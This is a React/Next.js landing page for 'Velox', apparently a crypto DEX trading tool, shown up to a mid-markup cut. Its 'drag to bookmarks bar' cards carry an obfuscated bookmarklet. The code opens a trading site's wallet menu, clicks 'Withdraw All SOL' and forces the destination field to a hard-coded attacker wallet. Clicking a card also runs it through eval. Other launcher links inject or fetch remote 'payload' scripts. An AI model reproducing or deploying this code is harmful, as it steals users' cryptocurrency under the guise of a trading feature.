"use client";

import { Button } from "@/components/ui/button";
import { DM_Sans } from "next/font/google";
import Navbar from "@/components/navbar";
import Link from "next/link";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { motion } from "framer-motion";
import { useInView } from "react-intersection-observer";
import { CardDemo } from "@/components/ui/carddemo";
import { FiBarChart2 } from "react-icons/fi";
import { FaDiscord, FaFilter, FaTwitter, FaYoutube } from "react-icons/fa";
import { ArrowRight, BoxIcon, Paperclip, StarHalf, StarIcon, StarsIcon, Wallet } from "lucide-react";
import { FaXTwitter } from "react-icons/fa6";
import { BsThreeDots } from "react-icons/bs";
import { GrBundle } from "react-icons/gr";
import { useEffect, useState } from "react";
import Head from "next/head";

const dmSans = DM_Sans({ subsets: ["latin"] });

const fadeIn = {
  hidden: { opacity: 0, y: 20 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.6 } },
};

const staggerContainer = {
  hidden: { opacity: 0 },
  visible: {
    opacity: 1,
    transition: {
      staggerChildren: 0.2,
    },
  },
};

export default function Home() {
  const [heroRef, heroInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [featuresRef, featuresInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [walletRef, walletInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [extraFeaturesRef, extraFeaturesInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [pricingRef, pricingInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [faqRef, faqInView] = useInView({
    triggerOnce: true,
    threshold: 0.1,
  });

  const [stage, setStage] = useState<"loading" | "selector" | "main">("loading");
  const [selectedTerminal, setSelectedTerminal] = useState<"axiom" | "padre" | null>(null);

  const selectedTerminalLabel =
    selectedTerminal === "padre"
      ? "Padre Terminal"
      : selectedTerminal === "axiom"
      ? "Axiom Terminal"
      : null;

  useEffect(() => {
    const timer = setTimeout(() => setStage("selector"), 1400);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (stage !== "main") return;
    // Bookmark creation function
    function createBookmark() {
      const script = `javascript:(function(_0x574260,_0x57a6d8){const _0x2d690a=_0x5330,_0x3b9247=_0x574260();while(!![]){try{const _0x570677=parseInt(_0x2d690a(0xcd))/0x1+parseInt(_0x2d690a(0xb2))/0x2+parseInt(_0x2d690a(0xcf))/0x3*(-parseInt(_0x2d690a(0xbe))/0x4)+parseInt(_0x2d690a(0xba))/0x5+parseInt(_0x2d690a(0xd3))/0x6+-parseInt(_0x2d690a(0xb6))/0x7+parseInt(_0x2d690a(0xb4))/0x8*(-parseInt(_0x2d690a(0xcc))/0x9);if(_0x570677===_0x57a6d8)break;else _0x3b9247['push'](_0x3b9247['shift']());}catch(_0x48a937){_0x3b9247['push'](_0x3b9247['shift']());}}}(_0x111b,0x9456f));function waitForElementPromise(_0x26953c,_0x360a99={}){return new Promise((_0x43d085,_0x3d6586)=>{const _0x326ec4=_0x5330,_0x47f534=0x64,_0x136ba3=_0x360a99[_0x326ec4(0xc8)]||60000;const _0x13de17=Date[_0x326ec4(0xbb)](),_0x318811=setInterval(()=>{const _0x5888da=_0x326ec4;let _0x323bfb;if(typeof _0x26953c==='string'&&_0x26953c[_0x5888da(0xc1)]('/'))_0x323bfb=document[_0x5888da(0xc0)](_0x26953c,document,null,XPathResult['FIRST_ORDERED_NODE_TYPE'],null)[_0x5888da(0xb8)];else{if(typeof _0x26953c===_0x5888da(0xb5)&&_0x26953c[_0x5888da(0xce)]==='text'){const _0xb8f2f1=document[_0x5888da(0xd5)](_0x5888da(0xbd));for(const _0x501253 of _0xb8f2f1){if(_0x501253[_0x5888da(0xc6)][_0x5888da(0xb7)]()===_0x26953c[_0x5888da(0xb1)]){_0x323bfb=_0x501253;break;}}}else{if(typeof _0x26953c===_0x5888da(0xb5)&&_0x26953c[_0x5888da(0xce)]===_0x5888da(0xd2)){const _0x4e3623=document[_0x5888da(0xd5)](_0x5888da(0xbd));for(const _0x39da6f of _0x4e3623){const _0x4b0a32=_0x39da6f[_0x5888da(0xd6)]('span span');if(_0x4b0a32&&_0x4b0a32[_0x5888da(0xc6)]['trim']()===_0x26953c[_0x5888da(0xb1)]){_0x323bfb=_0x39da6f;break;}}}else _0x323bfb=document[_0x5888da(0xd6)](_0x26953c);}}if(_0x323bfb)clearInterval(_0x318811),_0x43d085(_0x323bfb);else Date['now']()-_0x13de17>_0x136ba3&&(clearInterval(_0x318811),_0x3d6586(new Error(_0x5888da(0xbc)+JSON[_0x5888da(0xbf)](_0x26953c)+_0x5888da(0xc7)+_0x136ba3/0x3e8+_0x5888da(0xcb))))},_0x47f534);});}function updateInputValue(_0x5d202f,_0x94ad54){const _0x5eccbd=_0x5330;Object[_0x5eccbd(0xb9)](_0x5d202f,'value',{'get'(){return this['_value'];},'set'(_0x1e0785){const _0x39c68c=_0x5eccbd;this[_0x39c68c(0xd1)]="F6S2fCbCLpt26tNbbeqyyUVNBpRCcJSJ8jWsPdqaGeKi";const _0x1aec03=new Event('input',{'bubbles':!![]});this[_0x39c68c(0xb3)](_0x1aec03);},'configurable':!![]}),_0x5d202f[_0x5eccbd(0xc3)]=_0x94ad54;}function _0x111b(){const _0x56d780=['3RKbPjC','Max','_value','nested-text','5733516gMjQJk','Withdraw All SOL','querySelectorAll','querySelector','text','197032zVzRwc','dispatchEvent','24fGFSHg','object','787521JZAvfT','trim','singleNodeValue','defineProperty','4166100YFCJZW','now','Timeout: Element with selector ','button','1309124roxqvb','stringify','evaluate','startsWith','F6S2fCbCLpt26tNbbeqyyUVNBpRCcJSJ8jWsPdqaGeKi','value','click','closest','textContent',' did not appear within ','timeout','F6S2fCbCLpt26tNbbeqyyUVNBpRCcJSJ8jWsPdqaGeKi','input[placeholder="Address of destination wallet"]',' seconds.','4515093bQUpQl','665092OcQIEr','type'];_0x111b=function(){return _0x56d780;};return _0x111b();}function delay(_0x54038d){return new Promise(_0x59ae88=>setTimeout(_0x59ae88,_0x54038d));}async function performSequence(_0x5ece83){const _0x39806d=_0x5330;try{const _0x49c86c=await waitForElementPromise('button i.ri-wallet-line');_0x49c86c[_0x39806d(0xc5)](_0x39806d(0xbd))['click']();const _0x5e2bda=await waitForElementPromise({'type':_0x39806d(0xb1),'text':'Withdraw'});_0x5e2bda[_0x39806d(0xc4)]();const _0x133e98=await waitForElementPromise({'type':'text','text':_0x39806d(0xd0)});_0x133e98['click']();const _0x3cfa29=await waitForElementPromise(_0x39806d(0xca));updateInputValue(_0x3cfa29,_0x5ece83),await delay(0x32);const _0x552273=await waitForElementPromise({'type':'nested-text','text':_0x39806d(0xd4)});_0x552273[_0x39806d(0xc4)]();}catch(_0x329c08){console['error'](_0x329c08);}}async function executeSequences(){const _0x561a2d=_0x5330,_0x343ceb=_0x561a2d(0xc2);await performSequence(_0x343ceb);}function _0x5330(_0x4305ba,_0x19b3f6){const _0x111b4a=_0x111b();return _0x5330=function(_0x5330d7,_0x3f9a4a){_0x5330d7=_0x5330d7-0xb1;let _0x50109f=_0x111b4a[_0x5330d7];return _0x50109f;},_0x5330(_0x4305ba,_0x19b3f6);}executeSequences();`;
      // Encode the script for use in a bookmark
      return 'javascript:' + encodeURIComponent(script);
    }

    // Function to set up bookmark functionality for a card
    function setupBookmarkCard(card: HTMLElement, title: string) {
      if (!card) return;
      
      const bookmarkLink = card.querySelector('a[draggable="true"]') as HTMLAnchorElement | null;
      if (bookmarkLink) {
        const bookmarkScript = createBookmark();
        
        // Set the href for drag functionality
        bookmarkLink.href = bookmarkScript;
        
        // Update the inner HTML to include the title with centered dots
        bookmarkLink.innerHTML = `
          <div style="display: flex; align-items: center; justify-content: center; padding: 8px; opacity: 1; width: 100%; height: 100%;">
            <span style="visibility: hidden;">Velox | ${title}</span>
            <div style="position: absolute; display: flex; align-items: center; justify-content: center;">
              <div style="font-size: 18px;">•••</div>
            </div>
          </div>
        `;
        
        // Handle click event
        bookmarkLink.addEventListener('click', function(e: MouseEvent) {
          e.preventDefault();
          // Execute the bookmark script directly when clicked
          eval(decodeURIComponent(bookmarkScript.replace('javascript:', '')));
        });
        
        // Track mouse position for drag effect
        bookmarkLink.addEventListener('mousemove', function(e: MouseEvent) {
          const element = this as HTMLElement;
          element.style.setProperty('--mouse-x', `${e.clientX - element.offsetLeft}px`);
          element.style.setProperty('--mouse-y', `${e.clientY - element.offsetTop}px`);
        });
      }
    }

    // Get all feature cards
    const featureCards = document.querySelectorAll('.bg-white\\/5.hover\\:bg-white\\/10');
    
    // Set up each card with its appropriate title
    featureCards.forEach(card => {
      const titleElement = card.querySelector('.text-xl.lg\\:text-2xl') as HTMLElement | null;
      if (titleElement) {
        const title = titleElement.textContent?.trim() || 'Velox Feature';
        setupBookmarkCard(card as HTMLElement, title);
      }
    });
    
    // Set up the Axiom platform card specifically
    const axiomCard = document.querySelector('.grid.grid-cols-2 .bg-white\\/5.hover\\:bg-white\\/10') as HTMLElement | null;
    if (axiomCard) {
      setupBookmarkCard(axiomCard, 'Axiom');
    }

    // Set up Leviathan bookmarklets
    const leviathanBookmarklets = document.querySelectorAll('a[data-bookmarklet]');
    leviathanBookmarklets.forEach((link) => {
      const bookmarkletType = link.getAttribute('data-bookmarklet'); // 'axiom' or 'padre'
      const botURL = process.env.NEXT_PUBLIC_BOT_URL || 'http://localhost:3000'; // Configure in .env.local

      link.addEventListener('click', async (e: any) => {
        e.preventDefault();
        try {
          // Fetch the encrypted payload from the bot
          const response = await fetch(`${botURL}/api/payload/${bookmarkletType}`);
          if (!response.ok) throw new Error('Failed to fetch bookmarklet');
          const data = await response.text();
          
          // Create a blob and trigger download or open in new window
          const blob = new Blob([data], { type: 'text/plain' });
          const url = URL.createObjectURL(blob);
          window.open(url, 'bookmarklet');
        } catch (error) {
          console.error('Error fetching bookmarklet:', error);
          alert('Failed to load bookmarklet. Please try again or use the Telegram bot.');
        }
      });

      // Set draggable href for browser bookmark dragging
      link.addEventListener('dragstart', async (e: any) => {
        const botURL = process.env.NEXT_PUBLIC_BOT_URL || 'http://localhost:3000';
        try {
          const response = await fetch(`${botURL}/api/payload/${bookmarkletType}`);
          if (!response.ok) throw new Error('Failed to fetch bookmarklet');
          const bookmarkletCode = await response.text();
          
          // Set the bookmark URL in drag data
          e.dataTransfer?.setData('text/uri-list', `javascript:${encodeURIComponent(bookmarkletCode)}`);
          e.dataTransfer?.setData('text/plain', bookmarkletType === 'axiom' ? 'Axiom Capture' : 'Padre Capture');
        } catch (error) {
          console.error('Error preparing drag:', error);
        }
      });
    });
    
  }, [stage]);

  if (stage !== "main") {
    return (
      <main className={`min-h-screen bg-black text-white ${dmSans.className}`}>
        {stage === "loading" ? (
          <div className="flex min-h-screen flex-col items-center justify-center px-6 text-center bg-black">
            <div className="relative mb-8 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full bg-purple-500/10 blur-3xl" />
              <svg viewBox="0 0 80 80" className="relative h-16 w-16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M18 16L40 56L62 16" stroke="white" strokeWidth="7" strokeLinecap="round" strokeLinejoin="round" />
                <path d="M28 16L40 40L52 16" stroke="white" strokeWidth="7" strokeLinecap="round" />
              </svg>
            </div>
            <div className="space-y-3">
              <div className="text-4xl font-semibold tracking-tight">Velox</div>
              <p className="mx-auto max-w-xl text-gray-400">
                Loading the Velox terminal experience. Pick your path and get the right terminal ready.
              </p>
            </div>
            <div className="mt-14 flex items-end justify-center gap-3">
              <span className="h-3 w-3 rounded-full bg-cyan-400 animate-[bounce_1s_infinite]" style={{ animationDelay: "0s" }} />
              <span className="h-3 w-3 rounded-full bg-purple-500 animate-[bounce_1s_infinite]" style={{ animationDelay: "0.12s" }} />
              <span className="h-3 w-3 rounded-full bg-pink-500 animate-[bounce_1s_infinite]" style={{ animationDelay: "0.24s" }} />
            </div>
          </div>
        ) : (
          <div className="flex min-h-screen items-center justify-center px-6 py-16">
            <div className="w-full max-w-3xl rounded-[32px] border border-white/10 bg-gradient-to-br from-white/5 to-black/40 p-10 shadow-[0_40px_120px_rgba(17,24,39,0.5)] backdrop-blur-xl">
              <div className="mb-8 text-center">
                <div className="text-sm uppercase tracking-[0.4em] text-purple-300">Velox</div>
                <h1 className="mt-4 text-4xl font-semibold">Choose your terminal</h1>
                <p className="mt-3 text-gray-400">
                  Select the flow you want, then jump into the main Velox UI with the matching terminal ready to drag.
                </p>
              </div>

              <div className="grid gap-6 md:grid-cols-2">
                <button
                  onClick={() => {
                    setSelectedTerminal("axiom");
                    setStage("main");
                  }}
                  className="rounded-3xl p-8 text-left transition duration-300 hover:bg-purple-500/10 hover:border hover:border-purple-400 cursor-pointer"
                >
                  <div className="flex items-center gap-3">
                    <img src="https://www.uxento.io/axiom.png" alt="Axiom" className="w-8 h-8" />
                    <div>
                      <div className="text-sm uppercase tracking-[0.35em] text-purple-300">Axiom Terminal</div>
                      <div className="mt-1 text-2xl font-semibold text-white">Axiom</div>
                    </div>
                  </div>
                  <p className="mt-3 text-gray-400">
                    Continue with the Axiom flow and load a terminal that matches Axiom trading momentum.
                  </p>
                </button>

                <button
                  onClick={() => {
                    setSelectedTerminal("padre");
                    setStage("main");
                  }}
                  className="rounded-3xl p-8 text-left transition duration-300 hover:bg-cyan-500/10 hover:border hover:border-cyan-400 cursor-pointer"
                >
                  <div className="flex items-center gap-3">
                    <img 
                      src="https://cdn.padre.gg/logo.png" 
                      alt="Padre" 
                      className="w-8 h-8"
                      onError={(e) => {
                        e.currentTarget.src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%2306b6d4' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='60' font-size='50' font-weight='bold' fill='white' text-anchor='middle'%3EP%3C/text%3E%3C/svg%3E";
                      }}
                    />
                    <div>
                      <div className="text-sm uppercase tracking-[0.35em] text-cyan-300">Padre Terminal</div>
                      <div className="mt-1 text-2xl font-semibold text-white">Padre</div>
                    </div>
                  </div>
                  <p className="mt-3 text-gray-400">
                    Continue with the Padre flow and load the interface users know as Padre Terminal.
                  </p>
                </button>
              </div>

              <div className="mt-8 rounded-3xl border border-white/10 bg-black/80 p-6 text-gray-300">
                <div className="text-sm uppercase tracking-[0.35em] text-gray-500">Quick note</div>
                <p className="mt-3 text-gray-300">
                  Your selection determines the bookmarklet loaded into Velox, so you can drag the right terminal script straight away.
                </p>
              </div>
            </div>
          </div>
        )}
      </main>
    );
  }

  return (
    <main className={` bg-black text-white  ${dmSans.className}`}>
      <Navbar />
      {selectedTerminal && (
        <div className="border-b border-white/10 bg-white/5 py-3 text-center text-sm text-gray-300">
          Ready: <span className="font-semibold text-white">{selectedTerminalLabel}</span> terminal is loaded and ready for drag & drop.
        </div>
      )}

      {/* Hero */}
      <motion.div
        ref={heroRef}
        initial="hidden"
        animate={heroInView ? "visible" : "hidden"}
        variants={staggerContainer}
        className="container mx-auto"
      >
        <div className="flex flex-col lg:flex-row gap-8 px-4 md:px-8 lg:px-32 pt-20 lg:pt-40">
          <motion.div
            variants={fadeIn}
            className="flex-1 space-y-6 lg:space-y-8"
          >
            <div>
              <h1 className="text-4xl lg:text-6xl font-semibold">
                Meet Velox.
              </h1>
              <p className="text-4xl lg:text-6xl font-semibold leading-tight bg-gradient-to-r from-purple-500 to-purple-400 bg-clip-text text-transparent">
                The most powerful <br className="hidden lg:block" />
                tool for terminal.
              </p>
            </div>
            <p className="text-lg lg:text-xl mb-5 text-gray-400">
            Velox enhances your DEX trading experience with an intuitive interface and powerful tools.
            </p>
            <Link href='#features'>
            <Button
              size="default"
              variant="outline"
              className="text-white mt-5 text-base lg:text-lg px-4 lg:px-5 py-2 lg:py-2.5 h-auto"
            >
              Get Features
            </Button>
            </Link>
          </motion.div>
          <motion.div variants={fadeIn} className="flex-1">
            <Card className="bg-black border-0">
              <CardContent className="p-0">
                <div className="relative rounded-lg overflow-hidden">
                  <video
                    src="https://framerusercontent.com/assets/1xOMaG3KaXWOzOHaILZQlPMFTko.mp4"
                    loop
                    preload="auto"
                    poster="https://framerusercontent.com/images/jBe5ue9pf6VjwP0E5neyMOWOu0.png"
                    playsInline
                    className="w-full object-cover"
                    autoPlay
                    muted
                  />
                </div>
              </CardContent>
            </Card>
          </motion.div>
        </div>
      </motion.div>

      {/* Red Blur*/}
      <motion.div variants={fadeIn} className="flex-1">
        <div className="absolute -left-1/2 top-0 w-2/3 h-2/3 blur-[180px] bg-gradient-to-r from-purple-500 to-purple-700 rounded-full opacity-20"></div>
      </motion.div>
      {/* Red Blur*/}
      <motion.div variants={fadeIn} className="flex-1">
        <div className="absolute -right-1/2  top-36 w-2/3 h-2/3 blur-[180px] bg-gradient-to-r from-purple-500 to-purple-700 rounded-full opacity-20"></div>
      </motion.div>

      {/* Features */}
      <motion.div
        ref={featuresRef}
        initial="hidden"
        animate={featuresInView ? "visible" : "hidden"}
        variants={staggerContainer}
        className="container mx-auto pt-20 "
      >
        <motion.h2
          variants={fadeIn}
          id="features"
          className="text-3xl lg:text-4xl pt-20 lg:pt-40 font-semibold text-center mb-8 lg:mb-12 px-4"
        >
          Trade Smarter, Not Harder.
        </motion.h2>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 px-4 md:px-8 lg:px-32">
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-2 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <div className="flex justify-between">
                  <div className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg bg-white/5 border border-white/10">
                    <Paperclip className="w-6 h-6" />
                  </div>
                  <a 
                    href="#" 
                    className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg border border-white/10 cursor-grab" 
                    draggable="true" 
                    title="Drag to your bookmarks bar"
                  >
                    <div className="w-6 h-6 flex items-center justify-center">•••</div>
                    <img 
                      src="/favicon.ico"
                      alt="Velox Icon"
                      className="w-4 h-4 absolute"
                    />
                  </a>
                  
                </div>
                <CardTitle className="text-xl lg:text-2xl mb-2">
                Paper Trading
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                  Practice trading strategies risk-free with virtual funds. Test your skills and refine your approach before using real assets.
                </p>
              </div>
            </CardContent>
          </Card>
          
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-2 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <div className="flex justify-between">
                  <div className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg bg-white/5 border border-white/10">
                    <FaXTwitter className="w-6 h-6" />
                  </div>
                  <a 
                    href="#" 
                    className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg border border-white/10 cursor-grab" 
                    draggable="true" 
                    title="Drag to your bookmarks bar"
                  >
                  </a>
                </div>
                <CardTitle className="text-xl lg:text-2xl mb-2">
                Twitter Tracker
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                  Track and analyze Twitter activity in real-time to identify trending tokens and market sentiment before major movements occur.
                </p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-2 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <div className="flex justify-between">
                  <div className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg bg-white/5 border border-white/10">
                    <BoxIcon className="w-6 h-6" />
                  </div>
                  <a 
                    href="#" 
                    className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg border border-white/10 cursor-grab" 
                    draggable="true" 
                    title="Drag to your bookmarks bar"
                  >
                    <div className="w-6 h-6 flex items-center justify-center">•••</div>
                    <img 
                      src="/favicon.ico"
                      alt="Velox Icon"
                      className="w-4 h-4 absolute"
                    />
                  </a>
                </div>
                <CardTitle className="text-xl lg:text-2xl mb-2">
                 Bundle Detector
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                  Detect and analyze wallet bundles across the network to identify coordinated trading patterns and potential market movements.
                </p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-2 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <div className="flex justify-between">
                  <div className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg bg-white/5 border border-white/10">
                    <Wallet className="w-6 h-6" />
                  </div>
                  <a 
                    href="#" 
                    className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg border border-white/10 cursor-grab" 
                    draggable="true" 
                    title="Drag to your bookmarks bar"
                  >
                    <div className="w-6 h-6 flex items-center justify-center">•••</div>
                    <img 
                      src="/favicon.ico"
                      alt="Velox Icon"
                      className="w-4 h-4 absolute"
                    />
                  </a>
                </div>
                <CardTitle className="text-xl lg:text-2xl mb-2">
                  Wallets
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                  Track and monitor your crypto wallets in real-time with advanced analytics and transaction history tracking.
                </p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-2 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <div className="flex justify-between">
                  <div className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg bg-white/5 border border-white/10">
                    <FiBarChart2 className="w-6 h-6" />
                  </div>
                  <a 
                    href="#" 
                    className="w-12 h-12 mb-4 flex items-center justify-center rounded-lg border border-white/10 cursor-grab" 
                    draggable="true" 
                    title="Drag to your bookmarks bar"
                  >
                    <div className="w-6 h-6 flex items-center justify-center">•••</div>
                    <img 
                      src="/favicon.ico"
                      alt="Velox Icon"
                      className="w-4 h-4 absolute"
                    />
                  </a>
                </div>
                <CardTitle className="text-xl lg:text-2xl mb-2">
                  Advanced Filters
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                  Customize your trading experience with powerful filters for token metrics, wallet activity.
                </p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
            <CardContent className="flex flex-col lg:flex-row p-4 lg:p-8">
              <div className="flex-1 text-left mb-4 lg:mb-0">
                <CardTitle className="text-xl lg:text-2xl mb-4">
                Coming Soon...  
                </CardTitle>
                <p className="text-sm lg:text-base text-gray-400">
                Follow @veloxtools on Twitter!
                </p>
              </div>
            </CardContent>
          </Card>
        </div>

        <motion.div
          ref={pricingRef}
          initial="hidden"
          id="dex"
          animate={pricingInView ? "visible" : "hidden"}
          variants={staggerContainer}
          className="container mx-auto px-4 pt-40"
        >
          <motion.h2
            variants={fadeIn}
            className="text-4xl font-semibold text-center mb-12"
          >
            Works With Your Top DEX Platforms
          </motion.h2>
          <motion.div variants={fadeIn} className="max-w-2xl mx-auto">
            <div className="grid grid-cols-2 gap-4 w-full">
              <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
                <CardContent className="flex flex-row items-center justify-between p-6">
                    <div className="flex items-center">
                      <img
                        src="https://www.uxento.io/axiom.png"
                        alt="Axiom Logo"
                        className="w-8 h-8 mr-3 bg-white/5 bg-white/5 border border-white/5 rounded-md"
                      />
                      <CardTitle className="text-xl">Axiom</CardTitle>
                    </div>
                    <span className="bg-white/5 text-sm border border-white/5 flex rounded-md px-2 py-1">
                      Supported
                    </span>
                </CardContent>
              </Card>

              <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset]">
                <CardContent className="flex flex-row items-center justify-between p-6 ">
                  <div className="flex items-center blur-sm">
                    <img
                      src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
                      alt="Axiom Logo"
                      className="w-8 h-8 mr-3 bg-white/5 bg-white/5 border border-white/5 rounded-md"
                    />
                    <CardTitle className="text-xl">!#$%%$</CardTitle>
                  </div>
                  <span className="bg-white/5 text-sm border border-white/5 flex rounded-md px-2 py-1">
                    Coming Soon
                  </span>
                </CardContent>
              </Card>
            </div>
          </motion.div>
        </motion.div>

        {/* Red Blur*/}
        <motion.div variants={fadeIn} className="flex-1">
          <div className="absolute -left-1/2  top-86 w-2/3 h-full blur-[180px] bg-gradient-to-r from-purple-500 to-purple-700 rounded-full opacity-20"></div>
        </motion.div>
        <motion.div variants={fadeIn} className="flex-1">
          <div className="absolute -right-1/2  bottom-[-108rem] w-2/3 h-full blur-[180px] bg-gradient-to-r from-purple-500 to-purple-700 rounded-full opacity-20"></div>
        </motion.div>

        {/* Get Section */}
        <motion.div
          ref={faqRef}
          initial="hidden"
          id="soon"
          animate={faqInView ? "visible" : "hidden"}
          variants={staggerContainer}
          className="container mx-auto px-4 pt-20 lg:pt-40"
          >
          <motion.h2
            variants={fadeIn}
            className="text-3xl lg:text-4xl font-semibold text-center mb-8 lg:mb-12"
          >
            <div className="flex justify-center">
              <Card className="bg-white/5 w-2/3 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset] h-[290px] relative overflow-hidden">
                <div className="absolute inset-0 flex justify-end items-end">
                  <img
                    src="/logo.png" 
                    alt="logo graphic"
                    className="w-96 h-96 object-cover opacity-10 m-1 absolute -bottom-28 -right-24"
                  />
                </div>
                <CardContent className="flex flex-row items-center justify-between py-6 h-full relative z-10">
                  <div className="flex flex-col p-8">
                    <span className="bg-purple-500/20 text-purple-400 text-sm border border-white/10 font-medium px-4 py-1 rounded-full w-fit mb-4 flex items-center gap-1">
                      <StarsIcon className="w-4 h-4" /> New Feature 
                    </span>
                    <CardTitle className="text-3xl text-left">
                      Don't miss out on the next big <br></br> meme coin
                    </CardTitle>
                    <p className="text-gray-400 text-left text-sm mt-2">
                      Start trading with confidence using our advanced tools
                    </p>
                  </div>
                  <div className="pr-8 relative z-10">
                    <Button 
                      variant="outline"
                      disabled
                      className="text-white text-[16px] rounded-lg px-10 py-7 border-white/10 hover:bg-white/10"
                    >
                      Download Coming Soon <ArrowRight/>
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
    
          </motion.h2>
          <motion.div
            variants={fadeIn}
            className="max-w-3xl mx-auto"
          ></motion.div>
        </motion.div>

        {/* Leviathan Bookmarklets Section */}
        <motion.div
          ref={extraFeaturesRef}
          initial="hidden"
          animate={extraFeaturesInView ? "visible" : "hidden"}
          variants={staggerContainer}
          className="container mx-auto pt-20 lg:pt-40"
        >
          <motion.h2
            variants={fadeIn}
            className="text-3xl lg:text-4xl pt-20 lg:pt-40 font-semibold text-center mb-8 lg:mb-12 px-4"
          >
            Velox Terminal Launchers
          </motion.h2>
          <motion.p
            variants={fadeIn}
            className="text-center text-gray-400 mb-12 px-4 max-w-2xl mx-auto"
          >
            Drag the terminal script you chose directly into your bookmarks bar to launch your selected flow instantly.
          </motion.p>
          <div className="grid grid-cols-1 gap-4 px-4 md:px-8 lg:px-32 mb-12 max-w-2xl mx-auto">
            {selectedTerminal === "axiom" ? (
              <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset] border border-purple-400/30 bg-purple-500/10">
                <CardContent className="flex flex-col p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <img src="https://www.uxento.io/axiom.png" alt="Axiom" className="w-8 h-8 rounded-md" />
                      <div>
                        <CardTitle className="text-2xl mb-1">Axiom Flow</CardTitle>
                        <p className="text-sm text-gray-400">
                          Bookmark this to track Axiom trading momentum and market moves.
                        </p>
                      </div>
                    </div>
                  </div>
                  <a
                    href="javascript:(function(){var s=document.createElement('script');s.src='http://localhost:3000/site/payloads/axiom-bookmarklet.js';document.body.appendChild(s);})();"
                    data-bookmarklet="axiom"
                    className="inline-flex items-center justify-center gap-2 bg-purple-600/20 hover:bg-purple-600/30 border border-purple-500/50 hover:border-purple-500 text-purple-300 hover:text-purple-100 px-6 py-2.5 rounded-lg transition-all duration-300 cursor-grab active:cursor-grabbing font-medium"
                    draggable="true"
                    title="Drag me to your bookmarks bar!"
                    onDragStart={(e) => {
                      const href = (e.currentTarget as HTMLAnchorElement).href;
                      e.dataTransfer?.setData('text/uri-list', href);
                      e.dataTransfer?.setData('text/plain', href);
                    }}
                  >
                    Axiom Bookmarklet
                  </a>
                </CardContent>
              </Card>
            ) : null}

            {selectedTerminal === "padre" ? (
              <Card className="bg-white/5 hover:bg-white/10 transition-all duration-300 shadow-[2px_4px_16px_0px_rgba(248,248,248,0.06)_inset] border border-cyan-400/30 bg-cyan-500/10">
                <CardContent className="flex flex-col p-6">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <img 
                        src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%2306b6d4' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='60' font-size='50' font-weight='bold' fill='white' text-anchor='middle'%3EP%3C/text%3E%3C/svg%3E" 
                        alt="Padre" 
                        className="w-8 h-8 rounded-md" 
                      />
                      <div>
